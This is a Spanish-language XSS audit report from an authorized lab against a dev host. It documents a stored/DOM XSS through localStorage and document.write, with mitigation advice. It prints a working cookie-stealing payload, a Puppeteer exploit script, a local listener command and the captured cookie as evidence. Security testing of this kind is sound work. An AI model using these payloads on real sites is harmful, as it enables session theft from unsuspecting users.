# Informe de Auditoría XSS — entorno Kali (simulación)

Fecha: $(date +'%Y-%m-%dT%H:%M:%S')
Objetivo: http://web.dev.local:8082

Resumen ejecutivo
-----------------
- Vulnerabilidad encontrada: Sí (DOM/Stored XSS)
- Explotada activamente: Sí — prueba de exfiltración de cookie simulada y capturada en servidor controlado por atacante.

Detalles técnicos
-----------------
1) Punto/s de entrada identificados:
   - Parámetros GET: `name`, `comment` (formulario de comentarios). Los valores son guardados en localStorage y mostrados usando `document.write` sin escaping.
   - También existe lectura de `search` que se muestra con `document.write` (posible XSS reflejado/DOM si se usa).

2) Tipo de vulnerabilidad:
   - Stored XSS persistido vía localStorage + DOM XSS al renderizar los comentarios con `document.write` sin sanitizar.
   - Impacto: ejecución arbitraria de JavaScript en contexto del usuario; robo de cookies/tokens, carga de hooks externos (BeEF), CSRF ampliado, persistencia para otros visitantes.

3) Comandos y herramientas usadas (exactos)
   - Reconocimiento y pruebas rápidas:
     * curl -sS -D /tmp/headers.txt -o /tmp/root.html http://web.dev.local:8082
     * curl -sS "http://web.dev.local:8082/?search=%3Cscript%3Ealert(1)%3C/script%3E" -o /tmp/payload2.html
   - Listener atacante (captura de exfiltración):
     * nohup python3 -m http.server 9000 --bind 127.0.0.1 > /tmp/http_log.txt 2>&1 & echo $! > /tmp/http_pid
   - Explotación automatizada (headless browser):
     * Node script: /app/reports/xss_exploit.js (ejecutado con node desde el directorio del proyecto). Contenido principal:

```js
const puppeteer = require('puppeteer');
(async () => {
  const browser = await puppeteer.launch({args:['--no-sandbox','--disable-setuid-sandbox']});
  const page = await browser.newPage();
  // Simular sesión de la víctima
  await page.setCookie({name:'session', value:'SESSID12345', domain:'web.dev.local', path:'/', url:'http://web.dev.local:8082'});
  // Payload inyectado en el parámetro comment
  const payload = '<img src=x onerror="new Image().src=\'http://127.0.0.1:9000/?c=\'+encodeURIComponent(document.cookie)\">';
  const url = 'http://web.dev.local:8082/?name=attacker&comment=' + encodeURIComponent(payload);
  console.log('Navigating to', url);
  await page.goto(url, {waitUntil:'networkidle2'});
  await new Promise(r => setTimeout(r, 2000));
  // Cargar la página principal para que se rendericen los comentarios almacenados
  await page.goto('http://web.dev.local:8082/', {waitUntil:'networkidle2'});
  await new Promise(r => setTimeout(r, 2000));
  // Capturar HTML y contexto para evidencia
  const html = await page.content();
  console.log('PAGE_HTML_START');
  console.log(html);
  console.log('PAGE_HTML_END');
  const storedComments = await page.evaluate(()=>localStorage.getItem('comments'));
  const cookieValue = await page.evaluate(()=>document.cookie);
  console.log('STORED_COMMENTS:', storedComments);
  console.log('DOCUMENT_COOKIE:', cookieValue);
  await browser.close();
  console.log('Done');
})().catch(e=>{console.error(e); process.exit(1);});
```

4) Payload final empleado (texto y forma codificada en URL):
   - Payload HTML (usado dentro del parámetro `comment`):

```html
<img src=x onerror="new Image().src='http://127.0.0.1:9000/?c='+encodeURIComponent(document.cookie)">
```

   - Parámetro GET real (URL-encoded) usado en la prueba:
     http://web.dev.local:8082/?name=attacker&comment=%3Cimg%20src%3Dx%20onerror%3D%22new%20Image().src%3D'http%3A%2F%2F127.0.0.1%3A9000%2F%3Fc%3D'%2BencodeURIComponent(document.cookie)%22%3E

Evidencia de explotación
------------------------
- El servidor de prueba (python http.server en 127.0.0.1:9000) recibió peticiones que incluían la cookie exfiltrada:
  - Ejemplo registrado en /tmp/http_log.txt:
    "GET /?c=session%3DSESSID12345 HTTP/1.1"
- El script headless informó:
  - STORED_COMMENTS: [{"name":"attacker","comment":"<img src=x onerror=\"new Image().src='http://127.0.0.1:9000/?c='+encodeURIComponent(document.cookie)\">","date":"..."}]
  - DOCUMENT_COOKIE: session=SESSID12345
- Conclusión práctica: payload inyectado en `comment` fue persistido en localStorage y al renderizar los comentarios el navegador ejecutó el onerror del elemento <img>, realizando la exfiltración de cookies hacia el servidor atacante.

Impacto
-------
- Robo de cookies de sesión (demostrado), potencial robo de tokens en localStorage/sessionStorage, ejecución de hooks externos (p. ej. BeEF), persistencia que afecta a todos los usuarios que carguen la página.

Recomendaciones de mitigación
-----------------------------
1) Nunca usar document.write() con contenido no confiable; usar textContent/innerText o plantillas con escape.
2) Escapar/filtrar correctamente datos de usuario antes de almacenarlos o renderizarlos (contextual encoding para HTML/JS).
3) Implementar un Content Security Policy (CSP) restrictivo que limite la carga de scripts externos y la ejecución de inline JS.
4) Validar el origen y sanitizar parámetros en el servidor y en cliente.
5) Revisar uso de localStorage para no almacenar contenido ejecutable sin saneamiento.

Ilimitaciones y observaciones
-----------------------------
- Las pruebas se realizaron en un entorno de laboratorio autorizado contra el host objetivo indicado.
- Para la demostración se creó una cookie de sesión ficticia (session=SESSID12345) en el navegador headless para evidenciar el robo.

Archivos relevantes generados durante la auditoría
-------------------------------------------------
- /app/reports/xss_exploit.js  — script usado para automatizar la prueba con Puppeteer
- /tmp/http_log.txt           — log del servidor atacante (captura de la exfiltración)
- /tmp/root.html              — copia del homepage obtenida por curl

